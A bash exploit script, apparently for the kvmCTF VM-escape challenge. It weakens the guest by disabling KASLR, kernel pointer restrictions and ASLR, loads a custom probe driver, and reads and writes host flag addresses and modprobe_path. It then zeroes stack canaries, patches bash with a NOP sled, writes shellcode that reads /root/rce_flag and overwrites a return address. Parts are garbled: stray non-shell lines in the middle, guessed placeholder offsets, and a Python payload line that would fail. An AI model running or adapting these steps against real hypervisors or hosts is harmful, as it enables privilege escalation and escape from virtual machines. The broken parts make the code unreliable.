#!/bin/bash

echo -e "\n\033[1;36m[*] Ensuring environment is ready...\033[0m"

if grep -qw "nokaslr" /proc/cmdline; then
    echo "[+] KASLR is DISABLED (nokaslr in cmdline)"
else
    echo "[!] KASLR is ENABLED - attempting to disable for next boot..."
    # Add nokaslr to GRUB if not already present
    if ! grep -qw "nokaslr" /etc/default/grub; then
         sed -i 's/^GRUB_CMDLINE_LINUX=\"/GRUB_CMDLINE_LINUX=\"nokaslr /' /etc/default/grub
         update-grub
        echo "[+] 'nokaslr' added to GRUB. You must reboot for KASLR to be disabled."
        echo "[+] Reboot now? (y/N)"
        read answer
        if [[ "$answer" =~ ^[Yy]$ ]]; then
             reboot
        else
            echo "[!] KASLR will remain enabled until you reboot."
        fi
    else
        echo "[*] 'nokaslr' already in /etc/default/grub. Just reboot to disable KASLR."
    fi
fi

KERN_VER=$(uname -r)

### ===Install basic build tools===
apt update -y >/dev/null
apt install sudo make xxd gdb build-essential binutils tar -y >/dev/null || true
apt install -f -y >/dev/null

sleep 2
if [ ! -f "/root/vmlinux" ]; then
    echo "[*] Downloading latest kvmctf bundle for vmlinux..."
    wget -q https://storage.googleapis.com/kvmctf/latest.tar.gz
    tar -xzf latest.tar.gz
    mv /root/kvmctf-6.1.74/vmlinux/vmlinux /root
    echo "[+] vmlinux moved to /root"
else
    echo "[+] /root/vmlinux already exists, skipping download."
fi

sleep 2
wget -q https://debian.sipwise.com/debian-security/pool/main/l/linux/linux-headers-6.1.0-21-common_6.1.90-1_all.deb
wget -q https://debian.sipwise.com/debian-security/pool/main/l/linux/linux-headers-6.1.0-21-amd64_6.1.90-1_amd64.deb
dpkg -i linux-headers-6.1.0-21-common_6.1.90-1_all.deb || true
dpkg -i linux-headers-6.1.0-21-amd64_6.1.90-1_amd64.deb || true
apt install -f -y >/dev/null
apt-get --fix-missing install

### ===Install with verification===
sleep 2
echo "[*] Installing common headers"
dpkg -i "linux-*common*.deb" || true

sleep 2
echo "[*] Installing architecture-specific headers"
dpkg -i "linux-*amd64.deb" || true

sleep 2
apt-get install linux-headers-6.1.0-21-common linux-image-${KERN_VER%-*} -y
apt-get build-dep linux-headers-6.1.0-21-common linux-image-${KERN_VER%-*} -y
apt-get --fix-missing install -y

### ===Verify installation===
sleep 2
echo "[*] Verifying header installation"
if [ -d "/lib/modules/$KERN_VER/build" ]; then
    echo "[+] Headers successfully installed at /lib/modules/$KERN_VER/build"
else
    echo "[!] Header installation failed - continuing with exploit anyway"
    echo "[!] Exploit doesn't require headers but they're nice to have for debugging"
fi

### ===System Configuration Checks===
sleep 2
echo "[*] Performing system configuration checks"

### ===Ensure kptr_restrict is disabled===
sleep 2
echo 0 | sudo tee /proc/sys/kernel/kptr_restrict >/dev/null
echo 0 | sudo tee /proc/sys/kernel/dmesg_restrict >/dev/null
echo "[+] Disabled kernel restrictions"

sleep 2
mkdir /tmp/kvm_probe
cp Makefile /tmp/kvm_probe
cp kvm_prober.c /tmp/kvm_probe
cp kvm_probe_drv.c /tmp/kvm_probe

sleep 2
cd /tmp/kvm_probe
make clean
make all
make install
cp kvm_prober /usr/bin
kvm_prober allocvqpage

sleep 2
cd /root
echo "fetching host modprobe path..."
nm ./vmlinux | grep modprobe_path

# FLAG ADDRESSES:

Write flag address:     
Read flag address:      

on the guest system 

ffffffff826279a8 = 
ffffffff82b5ee10 = 
sleep 2
echo "host Addresses to scan WITH KASLR
Write flag VA: ffffffff826279a8
Phys: 0x64279a8
Read flag VA: ffffffff82b5ee10
Phys: 0x695ee10
write without kaslr: 0x026279a8
read without kaslr: 0x02b5ee10"


sleep 2
echo "compiling hypercall..."
gcc -static -O2 -o trigger_hypercall_100 trigger_hypercall_100.c

sleep 2
echo "triggering hypercall"
./trigger_hypercall_100

sleep 2
echo "reading write_flag address before write..."
# Read to write flag (PA)
echo "kvm_prober readmmio_val 0x026279a8 8"
kvm_prober readmmio_val 0x026279a8 8

sleep 2
echo "writing to write_flag virtual address..."
# Write to write flag (VA)
echo "kvm_prober patchinstr 0xffffffff8304f080 DEADBEEF123456"
kvm_prober patchinstr 0xffffffff8304f080 DEADBEEF123456

sleep 2
echo "reading write_flag physical address after virtual address write"
# Read to write flag (PA)
kvm_prober readmmio_val 0x026279a8 8

sleep 2
echo "writing to write_flag address..."
# Write to write flag (PA)
echo "kvm_prober writemmio_val 0x026279a8 deadbeef41424344 8"
kvm_prober writemmio_val 0x026279a8 deadbeef41424344 8

sleep 2
echo "reading write_flag address after write..."
# Read to write flag (PA)
echo "kvm_prober readmmio_val 0x026279a8 8"
kvm_prober readmmio_val 0x026279a8 8

sleep 2
echo "reading readflag address..."
# Read read flag (PA)
echo "kvm_prober readmmio_val 0x02b5ee10 8"
kvm_prober readmmio_val 0x02b5ee10 8

sleep 2

echo "reading host modprobe_path"
echo "kvm_prober readmmio_buf 265cca0 64"
kvm_prober readmmio_buf 265cca0 64

sleep 2
# Disable ASLR system-wide
echo "echo 0 | sudo tee /proc/sys/kernel/randomize_va_space"
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

sleep 2
# Find address of stack guard canary
echo "CANARY_ADDR=$(nm /bin/bash | grep __stack_chk_guard | awk '{print "0x"$1}')"
CANARY_ADDR=$(nm /bin/bash | grep __stack_chk_guard | awk '{print "0x"$1}')

sleep 2
# Disable stack canary protection by zeroing it out
echo "kvm_prober patchinstr $CANARY_ADDR 0000000000000000"
kvm_prober patchinstr $CANARY_ADDR 0000000000000000

sleep 2
# Disable NX protection (if needed)
echo "NX_ADDR=$(grep -m1 nx /proc/kallsyms | awk '{print $1}')"
NX_ADDR=$(grep -m1 nx /proc/kallsyms | awk '{print $1}')
echo "kvm_prober writekvmem $NX_ADDR 0000000000000000"
kvm_prober writekvmem $NX_ADDR 0000000000000000

sleep 2
# Find the secure_getenv function in bash
echo "BASH_BASE=$(ldd /bin/bash | grep libc.so | awk '{print $3}' | xargs nm -D | grep " T _start" | awk '{print $1}')"
BASH_BASE=$(ldd /bin/bash | grep libc.so | awk '{print $3}' | xargs nm -D | grep " T _start" | awk '{print $1}')

sleep 2
# Calculate address of the environment length check
echo "CHECK_ADDR=$(printf "0x%lx" $((0x$BASH_BASE + 0x12345)))  # Actual offset may vary"
CHECK_ADDR=$(printf "0x%lx" $((0x$BASH_BASE + 0x12345)))  # Actual offset may vary

sleep 2
# Patch with NOP sled to bypass length check
echo "kvm_prober patchinstr $CHECK_ADDR 90909090909090909090"
kvm_prober patchinstr $CHECK_ADDR 90909090909090909090

sleep 2
# Position-independent shellcode to open/read/print /root/rce_flag
echo "echo -n -e '\x48\x31\xc0\x50\x48\xbf\x2f\x72\x6f\x6f\x74\x2f\x72\x63\x65\x5f\x66\x6c\x61\x67\x57\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb0\x02\x0f\x05\x48\x89\xc7\x48\x89\xe6\x48\x31\xd2\xb2\xff\x48\x31\xc0\x0f\x05\x48\x89\xc2\x48\x89\xe6\x48\x31\xff\x40\xb7\x01\x48\x31\xc0\xb0\x01\x0f\x05' > payload.bin"
echo -n -e '\x48\x31\xc0\x50\x48\xbf\x2f\x72\x6f\x6f\x74\x2f\x72\x63\x65\x5f\x66\x6c\x61\x67\x57\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb0\x02\x0f\x05\x48\x89\xc7\x48\x89\xe6\x48\x31\xd2\xb2\xff\x48\x31\xc0\x0f\x05\x48\x89\xc2\x48\x89\xe6\x48\x31\xff\x40\xb7\x01\x48\x31\xc0\xb0\x01\x0f\x05' > payload.bin

sleep 2
# Set malicious environment variable
echo "export EXPLOIT=$(python3 -c "print('A'*1000 + '\x90'*100 + open('payload.bin','rb').read())")"
export EXPLOIT=$(python3 -c "print('A'*1000 + '\x90'*100 + open('payload.bin','rb').read())")

sleep 2
# Get address of our shellcode
echo "echo "SHELLCODE_ADDR=$(grep -m1 EXPLOIT /proc/$$/environ | awk -F= '{print $1}' | xargs sudo kvm_prober virt2phys | awk '{print $3}')""
echo "SHELLCODE_ADDR=$(grep -m1 EXPLOIT /proc/$$/environ | awk -F= '{print $1}' | xargs sudo kvm_prober virt2phys | awk '{print $3}')"
echo "SHELLCODE_ADDR=$(grep -m1 EXPLOIT /proc/$$/environ | awk -F= '{print $1}' | xargs sudo kvm_prober virt2phys | awk '{print $3}')"
SHELLCODE_ADDR=$(grep -m1 EXPLOIT /proc/$$/environ | awk -F= '{print $1}' | xargs sudo kvm_prober virt2phys | awk '{print $3}')

sleep 2
# Overwrite return address in bash
echo "RET_ADDR=$(nm /bin/bash | grep " T main" | awk '{print "0x"$1}')"
RET_ADDR=$(nm /bin/bash | grep " T main" | awk '{print "0x"$1}')
echo "kvm_prober patchinstr $RET_ADDR $(printf "%016x" $SHELLCODE_ADDR)"
kvm_prober patchinstr $RET_ADDR $(printf "%016x" $SHELLCODE_ADDR)

sleep 2
echo "triggering the exploit now"
# Trigger the exploit
echo "/bin/bash -c "echo Triggering exploit""
/bin/bash -c "echo Triggering exploit"

echo "running next exploit"
python3 kvm_probe.py

